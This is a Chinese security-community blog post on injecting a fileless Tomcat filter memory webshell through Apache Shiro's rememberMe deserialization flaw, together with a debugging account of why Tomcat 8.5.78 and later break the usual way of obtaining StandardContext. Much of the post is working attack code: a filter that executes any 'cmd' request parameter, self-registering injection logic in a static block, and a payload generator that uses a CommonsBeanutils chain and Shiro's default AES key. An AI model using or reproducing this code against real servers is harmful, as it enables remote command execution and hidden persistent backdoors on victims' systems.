

# shiro注入filter内存马及tomcat版本对获取context影响的分析 - 先知社区

shiro注入filter内存马及tomcat版本对获取context影响的分析

- - -

### 前言

这是个人在学习filter内存马注入的时候遇到的一个坑，希望后面学习的小白们能够避开。

#### 环境配置及准备

tomcat：tomcat8.5.50(正确版本)，tomcat8.5.79(踩坑版本)  
shiro环境：p神的Java安全配套环境(里面的shirodemo)[https://github.com/phith0n/JavaThings](https://github.com/phith0n/JavaThings)

### shiro注入filter内存马

在之前有了jsp型内存马实现的经验之后，我们需要思考一件事情。之前的以jsp形态为主的内存马的使用方式是通过上传文件然后再访问的方式进行利用，那么如果一个网站他没有文件上传的接口或者是功能这样的话我们该如何实现“种马”呢？这就要说到无文件落地内存马了，这种内存马一般是通过反序列化的方式注入到服务端当中而不会出现文件的落地。

如下是一个简单的jsp型filter内存马的一个简单实现，这里我写的很简洁，前半部分是恶意的filter，后半部分是注册动态注册filter

```plain
<%!
    public class EvilFilter implements Filter {
        public void init(FilterConfig filterConfig){
        }

        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            Runtime.getRuntime().exec(cmd);
            filterChain.doFilter(servletRequest, servletResponse);
        }

        public void destroy(){}
    }
%>

<%
    //StandardContext
    Field field = request.getClass().getDeclaredField("request");
    field.setAccessible(true);
    Request request1 = (Request) field.get(request);
    StandardContext context = (StandardContext) request1.getContext();

    //FilterDef
    Filter filter = new EvilFilter();
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("EvilFilter");
    filterDef.setFilterClass(filter.getClass().getName());
    context.addFilterDef(filterDef);

    //FilterConfig
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context, filterDef);
    Field field1 = StandardContext.class.getDeclaredField("filterConfigs");
    field1.setAccessible(true);
    Map filterConfigs = (Map)field1.get(context);
    filterConfigs.put("EvilFilter", filterConfig);

    //FilterMap
    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName("EvilFilter");
    filterMap.addURLPattern("/*");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    context.addFilterMap(filterMap);
%>
```

**FilterDefs**：存放FilterDef的数组 ，**FilterDef** 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息  
**FilterConfigs**：存放filterConfig的数组，在 **FilterConfig** 中主要存放FilterDef和Filter对象等信息  
**FilterMaps**：存放FilterMap的数组，在**FilterMap**中主要存放了FilterName和对应的URLPattern  
按照同样的逻辑，我们编写一个非jsp型的内存马的方式就是，找StandardContext->创建一个filterdef->利用反射找filterconfig，利用之前的filterdef创建相应对象并加到standardcontext里面->创建filtermap写上对应的urlpattern并放到context里面。

#### 内存马实现

编写内存马我们最一开始的出发点就是从获取StandardContext开始的，在网上大多数关于StandardContext在filter内存马当中的获取方式都是通过线程(ContextClassLoader)来获取，其具体情况可以看**bitterz师傅**写的文章[https://xz.aliyun.com/t/9914](https://xz.aliyun.com/t/9914) 其原因是当我们编写非jsp型内存马时，我们已经失去了request对象只能使用其他手段来获取。获取手段如下：

```plain
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
 StandardContext context = (StandardContext) webappClassLoaderBase.getResources().getContext();
```

结合之前的jsp型的内存马，经过简单的替换我们就将filter内存马的主体部分初步完成了，如下所示。这一部分事实上是关于内存马注入的(动态注册filter)，还剩下内存马的主体部分。

```plain
//StandardContext
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext context = (StandardContext) webappClassLoaderBase.getResources().getContext();

//FilterDef
Filter filter = new BehinderFilter();
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
filterDef.setFilterName("EvilFilter");
filterDef.setFilterClass(filter.getClass().getName());
context.addFilterDef(filterDef);

//FilterConfig
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context, filterDef);
Field field1 = StandardContext.class.getDeclaredField("filterConfigs");
field1.setAccessible(true);
Map filterConfigs = (Map)field1.get(context);
filterConfigs.put("EvilFilter", filterConfig);

//FilterMap
FilterMap filterMap = new FilterMap();
filterMap.setFilterName("EvilFilter");
filterMap.addURLPattern("/*");
filterMap.setDispatcher(DispatcherType.REQUEST.name());
context.addFilterMap(filterMap);
```

然后开始编写filter的主体部分，只需要写一个实现了filter接口的类就行，并加上一些必须要override的一些方法，由于后面在反序列化当中要用到TemplatesImpl用这个类来承载我们的恶意filter字节码，所以还要继承AbstractTranslet。由此我们得到如下的一个恶意filter

```plain
public class BehinderFilter extends AbstractTranslet implements Filter{

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws ServletException, IOException {
        String cmd = servletRequest.getParameter("cmd");
        Runtime.getRuntime().exec(cmd);
        filterChain.doFilter(servletRequest, servletResponse);
        System.out.println("doFilter");
    }

    @Override
    public void destroy() {
    }
}
```

但这只实现了恶意filter，并没有把动态注册filter的逻辑加进去，所以我们还应该考虑把之前写的代码塞到这里去，塞到哪里呢？在反序列化的时候恶意代码执行的位置一般都放在静态代码段以及构造函数当中，所以在filter内存马当中我们将动态注册filter的部分代码放到静态代码段中，让其在反序列化的时候就开始执行，最终我们得到shiro的filter型内存马。  
内存马如下：

```plain
public class BehinderFilter extends AbstractTranslet implements Filter{
    static {
        try {
            //StandardContext
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext context = (StandardContext) webappClassLoaderBase.getResources().getContext();
            //FilterDef
            Filter filter = new BehinderFilter();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName("EvilFilter");
            filterDef.setFilterClass(filter.getClass().getName());
            context.addFilterDef(filterDef);
            //FilterConfig
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context, filterDef);
            Field field1 = StandardContext.class.getDeclaredField("filterConfigs");
            field1.setAccessible(true);
            Map filterConfigs = (Map)field1.get(context);
            filterConfigs.put("EvilFilter", filterConfig);
            //FilterMap
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName("EvilFilter");
            filterMap.addURLPattern("/*");
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            context.addFilterMap(filterMap);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws ServletException, IOException {
        String cmd = servletRequest.getParameter("cmd");
        Runtime.getRuntime().exec(cmd);
        filterChain.doFilter(servletRequest, servletResponse);
        System.out.println("doFilter");
    }

    @Override
    public void destroy() {
    }
}
```

这里没有做回显处理只是简单的测试一下命令执行的功能。

#### 内存马测试

我们既然是要通过shiro的反序列化漏洞注入内存马，我们就要选择一个gadget，在通常情况下shiro是没有CC依赖的，所以我选择打CB链。具体的CB链payload的构成可以参照p神的java安全漫谈配套源码[https://github.com/phith0n/JavaThings](https://github.com/phith0n/JavaThings) 众所周知想要完成shiro的反序列化还需要用AES对生成的payload进行加密，所以我们最终得到的poc如下，使用如下代码段即可完成payload的生成（CommonsBeanutils1Shiro()就是p神的那条CB链）

```plain
public class Exp {
    public static void main(String []args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(BehinderFilter.class.getName());
        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```

至此，我们万事俱备，生成payload  
[![](assets/1705301743-91743225dcb7c27a17d834c12afdad02.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108164254-ea76359c-ae01-1.png)  
然后从cookie当中的rememberme字段传过去  
[![](assets/1705301743-8d92339c6d790fa619e634099da8c6c3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108164336-038a06c6-ae02-1.png)  
此时服务端会有报错，报了一个unable to deserialize argument byte array的错，所以内存马并没有成功  
[![](assets/1705301743-a538f5536a108032b0fce54f06bfa8d5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108164510-3b73d8be-ae02-1.png)

#### 问题何在？

事实上，这是市面上大部分人给出的shiro注入内存马的过程，但是很显然并不奏效，问题出在哪里？我们应该到源码中去寻找。  
通过报错我们把目光放在org.apache.shiro.io中的DefaultSerializer里面，在这个类的deserialize()方法里面，出现了我们想要看到的报错字段。也就是说该代码的逻辑在readobject的时候发生了错误从而抛出异常。  
[![](assets/1705301743-69343f8f20e9512d8061a8b1ca35f3df.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20240108164747-98beab16-ae02-1.jpg)  
所以这一次我们跟到反序列化里面去，尝试追踪他的反序列化过程，看看究竟是哪里的问题，前面的流程就不再赘述，就是CB链的前面的一些流程如果再详述的话就显得有些冗长。我们直接来到BeanComparator的compare方法当中（这里跟的是刚才的payload的流程）  
[![](assets/1705301743-22affbe5f9ff1584032ca239199f2e0a.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20240108164820-ace7fb2e-ae02-1.jpg)  
这里按照CB链的流程走的话就应该是拿到getoutputProperties然后调用该函数从而触发templatesImpl里面的恶意代码。  
[![](assets/1705301743-af9d04386478e9d6bbf32ee73cf25b17.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20240108164855-c16578c4-ae02-1.jpg)  
[![](assets/1705301743-e19e3bcc3ae7ebd27b97ec2e62f62146.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20240108164910-ca87caf6-ae02-1.jpg)  
从这边来看是没什么问题的，所以错误的发生不出现在反序列化的过程，而是出现在恶意代码段。为了排查是哪段代码出了问题，我在内存马的代码段里面加入了一些输出语句用于调试。  
[![](assets/1705301743-3d7a9c483197b056d3d0c3ae05815e24.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108164945-df865dc8-ae02-1.png)  
这一次我们重新发送payload，查看控制台的输出。我们最终发现代码只执行到了获取classloader的地方，下面获取context的地方就没有再执行了。  
[![](assets/1705301743-88637c86165a5821b70dd311492f6379.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108165022-f53c8912-ae02-1.png)  
问题就很明确了，是通过线程获取standardcontext这一方式出了问题，我们直接去WebappClassLoaderBase里面看具体的细节，找到getResources()函数。从下面的图中我们不难发现这里面的getResources()返回的是null而且只返回null。这就是问题的根源。  
[![](assets/1705301743-7cc36ac163a84d1c6b6d7009f265f1d8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108165110-1228f196-ae03-1.png)  
如果回看之前的报错信息我们还能发现一条最前面的报错信息，空指针异常。刚好契合。  
[![](assets/1705301743-37207d806d4390ed4774e43adec353c0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108165150-29bebc00-ae03-1.png)  
问题来了，为什么网上那么多人能够成功呢？原因出在tomcat的版本上，经过测试  
tomcat8.5.79的应该都是不行的，因为WebappClassLoaderBase#getResources()函数只返回null；但是tomcat8.5.50的版本它的WebappClassLoaderBase#getResources()函数是这样的  
[![](assets/1705301743-2c461a2f4ed84393196b8926616239f9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108165254-5000794e-ae03-1.png)  
于是把tomcat版本换成8.5.50，测试结果如下  
[![](assets/1705301743-70b7574edf2b82faca60cbc7bf825e1c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108165327-637e386c-ae03-1.png)

#### 后续版本的测试

经过了多个版本的更换最终测试出以下几个tomcat8版本的情况  
8.5.37可以，8.5.60可以，8.5.70可以，8.5.77可以，8.5.78不可以，8.5.79不可以，8.5.81不可以  
在tomcat8.5.78版本之后该方法被标为了Deprecated，而且其内部也是  
[![](assets/1705301743-4d027014fc7adfe978fc64ad3b28775a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108165437-8d202c3e-ae03-1.png)  
总结一下应该是8.5.78往后的tomcat8都不行只有之前的版本可以使用WebappClassLoaderBase#getResources()

### 后记

在有些博客当中会让你在pom当中当中添加tomcat8.5.50的依赖，这只会让你在运行前调试的时候成功。真正在运行时起作用的是你在idea里面edit configuration当中设置的local tomcat所以要想成功注入内存马必须要保证自己的tomcat8版本在8.5.78以下。

#### 参考连接

[https://github.com/phith0n/JavaThings](https://github.com/phith0n/JavaThings)  
[https://xz.aliyun.com/t/10362](https://xz.aliyun.com/t/10362)  
[https://xz.aliyun.com/t/9914](https://xz.aliyun.com/t/9914)
